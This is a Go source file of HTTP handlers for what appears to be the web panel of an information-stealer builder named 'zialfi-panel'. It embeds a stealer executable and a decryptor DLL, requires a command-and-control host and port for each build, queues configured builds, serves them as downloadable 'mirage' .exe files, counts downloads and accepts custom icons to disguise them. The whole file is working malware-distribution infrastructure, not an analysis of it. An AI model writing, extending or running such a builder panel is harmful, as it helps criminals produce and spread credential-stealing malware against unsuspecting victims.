package api

import (
	"crypto/sha256"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"

	"github.com/go-chi/chi/v5"
	"zialfi-panel/internal/db"
	"zialfi-panel/internal/middleware"
	"zialfi-panel/internal/services"
)

var safeIDPattern = regexp.MustCompile(`^[a-zA-Z0-9_-]+$`)

func safeIDParam(r *http.Request) string {
	id := chi.URLParam(r, "id")
	if !safeIDPattern.MatchString(id) {
		return ""
	}
	return id
}

type BuildHandler struct {
	service      *services.BuildService
	stealerExe   []byte
	decryptorDll []byte
	db           *sql.DB
}

func NewBuildHandler(service *services.BuildService, stealer, decryptor []byte, db *sql.DB) *BuildHandler {
	return &BuildHandler{service: service, stealerExe: stealer, decryptorDll: decryptor, db: db}
}

func (h *BuildHandler) Build(w http.ResponseWriter, r *http.Request) {
	var config services.BuildConfig
	if err := json.NewDecoder(r.Body).Decode(&config); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}

	if config.C2Host == "" || config.C2Port == 0 {
		writeError(w, http.StatusBadRequest, "c2_host and c2_port are required")
		return
	}
	if len(config.C2Host) > 256 {
		writeError(w, http.StatusBadRequest, "c2_host must be 256 characters or fewer")
		return
	}
	if config.C2Port < 1 || config.C2Port > 65535 {
		writeError(w, http.StatusBadRequest, "c2_port must be between 1 and 65535")
		return
	}

	configJSON, _ := json.Marshal(config)
	configHash := fmt.Sprintf("%x", sha256.Sum256(configJSON))
	modulesJSON, _ := json.Marshal(config.Modules)

	var buildID, createdAt string
	err := db.QueryRow(h.db, `INSERT INTO builds
		(config_hash, status, build_name, build_tag, module_config, user_id)
		VALUES (?, 'queued', ?, ?, ?, ?)
		RETURNING id, created_at`,
		configHash, config.BuildName, config.BuildTag, string(modulesJSON), claimsUserID(r),
	).Scan(&buildID, &createdAt)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to queue build")
		return
	}

	writeJSON(w, http.StatusAccepted, map[string]any{
		"id":         buildID,
		"status":     "queued",
		"build_name": config.BuildName,
		"build_tag":  config.BuildTag,
		"created_at": createdAt,
	})
}

// Status returns the current build status.
func (h *BuildHandler) Status(w http.ResponseWriter, r *http.Request) {
	buildID := chi.URLParam(r, "id")
	if buildID == "" || !safeIDPattern.MatchString(buildID) {
		writeError(w, http.StatusBadRequest, "invalid build id")
		return
	}
	var status, sha256, errorMsg string
	var fileSize int
	err := db.QueryRow(h.db, `SELECT status, COALESCE(sha256,''), COALESCE(file_size, 0), COALESCE(error_message,'')
		FROM builds WHERE id = ? AND user_id = ?`, buildID, claimsUserID(r),
	).Scan(&status, &sha256, &fileSize, &errorMsg)
	if err != nil {
		writeError(w, http.StatusNotFound, "build not found")
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"id":       buildID,
		"status":   status,
		"sha256":   sha256,
		"file_size": fileSize,
		"error":    errorMsg,
	})
}

func (h *BuildHandler) List(w http.ResponseWriter, r *http.Request) {
	tagFilter := r.URL.Query().Get("tag")

	var rows *sql.Rows
	var err error
	if tagFilter != "" {
		if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
			rows, err = db.Query(h.db, `
				SELECT id, config_hash, COALESCE(file_size, 0), COALESCE(sha256,''), COALESCE(build_tag,''), COALESCE(download_count, 0), created_at, COALESCE(module_config,'{}')
				FROM builds WHERE build_tag = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50
			`, tagFilter, claims.UserID)
		} else {
			rows, err = db.Query(h.db, `
				SELECT id, config_hash, COALESCE(file_size, 0), COALESCE(sha256,''), COALESCE(build_tag,''), COALESCE(download_count, 0), created_at, COALESCE(module_config,'{}')
				FROM builds WHERE build_tag = ? ORDER BY created_at DESC LIMIT 50
			`, tagFilter)
		}
	} else {
		if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
			rows, err = db.Query(h.db, `
				SELECT id, config_hash, COALESCE(file_size, 0), COALESCE(sha256,''), COALESCE(build_tag,''), COALESCE(download_count, 0), created_at, COALESCE(module_config,'{}')
				FROM builds WHERE user_id = ? ORDER BY created_at DESC LIMIT 50
			`, claims.UserID)
		} else {
			rows, err = db.Query(h.db, `
				SELECT id, config_hash, COALESCE(file_size, 0), COALESCE(sha256,''), COALESCE(build_tag,''), COALESCE(download_count, 0), created_at, COALESCE(module_config,'{}')
				FROM builds ORDER BY created_at DESC LIMIT 50
			`)
		}
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to query builds")
		return
	}
	defer rows.Close()

	type buildEntry struct {
		ID            string          `json:"id"`
		ConfigHash    string          `json:"config_hash,omitempty"`
		FileSize      int             `json:"file_size"`
		Sha256        string          `json:"sha256,omitempty"`
		BuildTag      string          `json:"build_tag,omitempty"`
		DownloadCount int             `json:"download_count"`
		ModuleConfig  json.RawMessage `json:"module_config,omitempty"`
		CreatedAt     string          `json:"created_at"`
	}

	builds := make([]buildEntry, 0)
	for rows.Next() {
		var b buildEntry
		var mc string
		if err := rows.Scan(&b.ID, &b.ConfigHash, &b.FileSize, &b.Sha256, &b.BuildTag, &b.DownloadCount, &b.CreatedAt, &mc); err != nil {
			continue
		}
		if mc != "" && mc != "{}" {
			b.ModuleConfig = json.RawMessage(mc)
		}
		builds = append(builds, b)
	}

	writeJSON(w, http.StatusOK, builds)
}

func (h *BuildHandler) Download(w http.ResponseWriter, r *http.Request) {
	id := safeIDParam(r)
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing or invalid build id")
		return
	}

	var fileData []byte
	var sha string
	err := db.QueryRow(h.db, "SELECT file_data, sha256 FROM builds WHERE id = ?", id).Scan(&fileData, &sha)
	if err == sql.ErrNoRows {
		writeError(w, http.StatusNotFound, "build not found")
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to fetch build")
		return
	}

	if !h.ownsBuild(r, id) {
		writeError(w, http.StatusForbidden, "access denied")
		return
	}

	db.Exec(h.db, "UPDATE builds SET download_count = download_count + 1 WHERE id = ?", id)

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="mirage_%s.exe"`, id[:8]))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(fileData)))
	w.Write(fileData)
}

func (h *BuildHandler) UpdateTag(w http.ResponseWriter, r *http.Request) {
	id := safeIDParam(r)
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing or invalid build id")
		return
	}

	var body struct {
		Tag string `json:"tag"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON body")
		return
	}

	if !h.ownsBuild(r, id) {
		writeError(w, http.StatusForbidden, "access denied")
		return
	}

	result, err := db.Exec(h.db, "UPDATE builds SET build_tag = ? WHERE id = ?", body.Tag, id)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to update build tag")
		return
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		writeError(w, http.StatusNotFound, "build not found")
		return
	}

	writeJSON(w, http.StatusOK, map[string]any{"id": id, "build_tag": body.Tag})
}

func (h *BuildHandler) UploadIcon(w http.ResponseWriter, r *http.Request) {
	id := safeIDParam(r)
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing or invalid build id")
		return
	}

	if !h.ownsBuild(r, id) {
		writeError(w, http.StatusForbidden, "access denied")
		return
	}

	r.Body = http.MaxBytesReader(w, r.Body, 256<<10)
	if err := r.ParseMultipartForm(256 << 10); err != nil {
		writeError(w, http.StatusBadRequest, "invalid multipart form or file too large")
		return
	}

	file, _, err := r.FormFile("icon")
	if err != nil {
		writeError(w, http.StatusBadRequest, "icon file required")
		return
	}
	defer file.Close()

	data, err := io.ReadAll(file)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to read icon")
		return
	}

	iconDir := "data/icons"
	if err := os.MkdirAll(iconDir, 0755); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to create icon directory")
		return
	}

	iconPath := filepath.Join(iconDir, filepath.Base(id+".ico"))
	if err := os.WriteFile(iconPath, data, 0644); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to save icon")
		return
	}

	writeJSON(w, http.StatusOK, map[string]any{
		"id":   id,
		"size": len(data),
	})
}

func (h *BuildHandler) ownsBuild(r *http.Request, buildID string) bool {
	return buildOwnedBy(h.db, r, buildID)
}

func (h *BuildHandler) Stats(w http.ResponseWriter, r *http.Request) {
	var rows *sql.Rows
	var err error
	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
		rows, err = db.Query(h.db, `
			SELECT id, COALESCE(build_tag,''), COALESCE(download_count, 0), COALESCE(file_size, 0), created_at
			FROM builds WHERE user_id = ? ORDER BY created_at DESC
		`, claims.UserID)
	} else {
		rows, err = db.Query(h.db, `
			SELECT id, COALESCE(build_tag,''), COALESCE(download_count, 0), COALESCE(file_size, 0), created_at
			FROM builds ORDER BY created_at DESC
		`)
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to query stats")
		return
	}
	defer rows.Close()

	type statEntry struct {
		ID            string `json:"id"`
		BuildTag      string `json:"build_tag,omitempty"`
		DownloadCount int    `json:"download_count"`
		FileSize      int    `json:"file_size"`
		CreatedAt     string `json:"created_at"`
	}

	stats := make([]statEntry, 0)
	var totalDownloads int
	for rows.Next() {
		var s statEntry
		if err := rows.Scan(&s.ID, &s.BuildTag, &s.DownloadCount, &s.FileSize, &s.CreatedAt); err != nil {
			continue
		}
		totalDownloads += s.DownloadCount
		stats = append(stats, s)
	}

	writeJSON(w, http.StatusOK, map[string]any{
		"builds":          stats,
		"total_downloads": totalDownloads,
	})
}
